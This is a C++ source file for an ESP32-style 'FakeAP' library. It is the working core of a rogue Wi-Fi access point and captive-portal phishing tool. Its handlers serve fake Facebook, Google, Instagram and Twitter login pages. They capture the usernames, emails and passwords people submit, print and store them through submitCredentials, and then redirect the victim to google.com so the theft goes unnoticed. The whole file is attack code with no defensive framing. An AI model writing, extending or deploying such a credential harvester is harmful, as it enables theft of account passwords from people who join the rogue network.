/**
 * @file FakeAPlib.cpp
 * @author NGUEYOU SIMO, Neil L. (you@domain.com)
 * @brief
 * @version 0.1
 * @date 2024-12-08
 *
 * @copyright Copyright (c) 2024
 *
 */

#include "FakeAPlib.h"

FakeAP::FakeAP()
	: WebServerManager(new SDCardManager(), SERVER_PORT)
{
}

FakeAP::FakeAP(const uint8_t &port)
	: WebServerManager(new SDCardManager(), port)
{
}


void FakeAP::handleSubmit(void)
{
	// variables para almacenar temporalmente las entradas del usuario
	String userID = "";
	if(m_server->hasArg("username"))   userID += m_server->arg("username");
	else if(m_server->hasArg("email")) userID += m_server->arg("email");

	String userPass = m_server->arg("password");
	String plarform = m_server->arg("platform");

	// se imprime por consola los valores de las entradas
	Serial.printf("Nuevas credenciales:\nPlataforma: %s\n", plarform.c_str());
	Serial.printf("Usuario: %s\nContraseña: %s\n",userID.c_str(), userPass.c_str());

	if (submitCredentials(plarform, userID, userPass))
	{
		m_sdManager->logEvent("Credentials sent and stored correctly");
#if (WITH_SUCCESS_MESSAGE)
		Serial.println(SUCCESS_SAVE_CREDENTIALS);
#endif
	}
	m_server->sendHeader("Location", "http://www.google.com");
	m_server->send(302, "text/plain", "Redirecting...");

	Serial.print("Actualmente hay ");
	Serial.print(WiFi.softAPgetStationNum());
	Serial.print(" hosts conectados.\n");
}


void FakeAP::handleLogin()
{
	if (m_server->method() == HTTP_GET)
	{
		if (getLoginPage(m_server->arg("platform")))
		{
			m_server->send(200, "text/html", _pageContent);
		}
		else
		{
			m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
		}
	}
}

void FakeAP::handleIcons(void)
{
	if (!m_server->hasArg("icon-name"))
	{
		m_server->send(400, "text/plain", "");
		return;
	}
	int platform = m_server->arg("icon-name").charAt(0);

	String temp;
	switch (platform)
	{
	case FACEBOOK:
		temp = "/icons/icons8-facebook-48.svg";
		break;
	case GOOGLE:
		temp = "/icons/icons8-google-48.svg";
		break;
	case INSTAGRAM:
		temp = "/icons/icons8-instagram-48.svg";
		break;
	case TWITTER:
		temp = "/icons/icons8-twitterx-48.svg";
		break;
	default:
		temp = "/icons/public-wifi-5403_128.gif";
		break;
	}

	File file = m_sdManager->getFileSystem().open(
					m_sdManager->getFileDir(m_indexPage) + temp);

	if(!file)
	{
#if (WITH_ERROR_TYPE)
		Serial.println(ERROR_FILE_OPEN);
#endif
		return m_server->send(404, "text/plain", "File not found");
	}
	String fileName = file.name();
	size_t fileSize = file.size();

	Serial.printf("Sending file %s to client\n", fileName.c_str());

	m_server->sendHeader("Content-Type", fileName.endsWith(".svg")? 
							"image/svg+xml" : "image/gif");
	m_server->sendHeader("Content-Length", String(fileSize));
	m_server->sendHeader("Connection", "close");
	m_server->sendHeader("Cache-Control", "max-age=31536000");
	m_server->setContentLength(fileSize);
	m_server->streamFile(*file, "application/octet-stream");

    file.close();
}

bool FakeAP::initialize(const String &AP_SSID, const String &AP_PSW,
						const String &WIFI_SSID, const String &WIFI_PSW)
{
	if (!m_sdManager->initialize())
	{
#if (WITH_ERROR_TYPE)
		Serial.println(ERROR_SD_NOT_INIT);
#endif
		return 0;
	}

	if (!setAccessPoint(AP_SSID, AP_PSW))
	{
		m_sdManager->logEvent("Failed to start access point: " + AP_SSID);
		return 0;
	}
	else
	{
		m_sdManager->logEvent("Acces point initialized correctly: " + AP_SSID);
	}

	if (WIFI_PSW != NULL)
	{
		!setWifiStation(WIFI_SSID, WIFI_PSW) ? m_sdManager->logEvent("Failed to connect to: " + WIFI_SSID) : m_sdManager->logEvent("Connected to: " + WIFI_SSID + "\nIP address: " + WiFi.localIP().toString());
	}

	delay(2000);
	AP_PSW == NULL ? startCaptiveServer() : this->start();
	m_sdManager->logEvent("Server started");
	return 1;
}

void FakeAP::printFilesContent()
{
	if (m_indexPage != "\0")
		Serial.println(m_sdManager->readFile(m_indexPage));
	delay(1500);
	if (m_exitPage != "\0")
		Serial.println(m_sdManager->readFile(m_exitPage));
	delay(1500);
	if (m_indexPage != "\0")
		Serial.println(m_sdManager->readFile(LOG_FILE));
	delay(1500);
}


void FakeAP::getImageFile(const String& iconName)
{
	if (_client->connect(*_serverIP, 80))
	{
		String url = "/get-page-icons?icon-name=" + iconName;

		_client->print(String("GET ") + url + " HTTP/1.1\r\n" +
						"Host: " + _serverIP->toString() + "\r\n" +
						"Connection: close\r\n\r\n");

		while (_client->connected() && !_client->available())
			delay(3);

		int contentLength = -1;
		bool isImage = 0;
		while (_client->available())
		{
			String line = _client->readStringUntil('\n');
			if (line.startsWith("Content-Length: "))
				contentLength = line.substring(16).toInt();

			if (line.startsWith("Content-Type: image/png"))
            	isImage = true;

			if (line == "\r")
				break;
		}

		if (!isImage || contentLength <= 0)
		{
			_client->stop();
			Serial.println(ERROR_SERVER_IMAGE);
			m_server->send(500, "text/plain", "Invalid response from server");
			return;
		}

		m_server->sendHeader("Content-Length", String(contentLength));
		m_server->sendHeader("Content-Type", "image/png");
		m_server->setContentLength(contentLength);
		m_server->send(200, "image/png", "");

		uint8_t buffer[1024];
		int totalRead = 0;
		Serial.println("Receiving and sending file bytes to client");
		while (_client->available() && totalRead < contentLength)
		{
			int buffSize = sizeof(buffer);
			//int bytesRead = _client->read(buffer, min(buffSize , contentLength - totalRead));
			int bytesRead = _client->read(buffer, min(buffSize, contentLength - totalRead));
			if (bytesRead > 0)
			{	
				m_server->client().write(buffer, bytesRead);
				totalRead += bytesRead;
			}
		}

		_client->stop();
	}
}

void FakeAP::startCaptiveServer()
{
	m_server->on("/", HTTP_GET, [this]()
				 { handleRoot(); });

	m_server->on("/submit", HTTP_POST, [this]()
				 { handleSubmit(); });

	m_server->on("/login", HTTP_GET, [this](){
		if (getLoginPage(m_server->arg("platform"))) 
		{
			m_server->send(200, "text/html", _pageContent);
		} 
		else 
		{
			m_server->send(401, "application/json", "{\"status\":\"unauthorized\"}");
		} 
	});

	m_server->on("/index/index-styles.css", HTTP_GET, [this](){ 
		String content = m_sdManager->readFile(
							m_sdManager->getFileDir(m_indexPage)
							+ "/index-styles.css"
							);
		m_server->send(200, "text/css", content);
	});

	m_server->on("/index/icons", HTTP_GET, [this]()
				 { handleIcons(); });

	m_server->on("/index/page-icon", HTTP_GET, [this]() {
				getImageFile(m_server->arg("icon-name")); });


	m_server->onNotFound([this]()
						 { handleRoot(); });

	setupCaptivePortal();
	m_server->begin();
	setServerIP(WiFi.gatewayIP());

#if (WITH_SUCCESS_MESSAGE)
	Serial.println(SUCCESS_APSERVER_INIT);
#endif
	delay(1500);
}
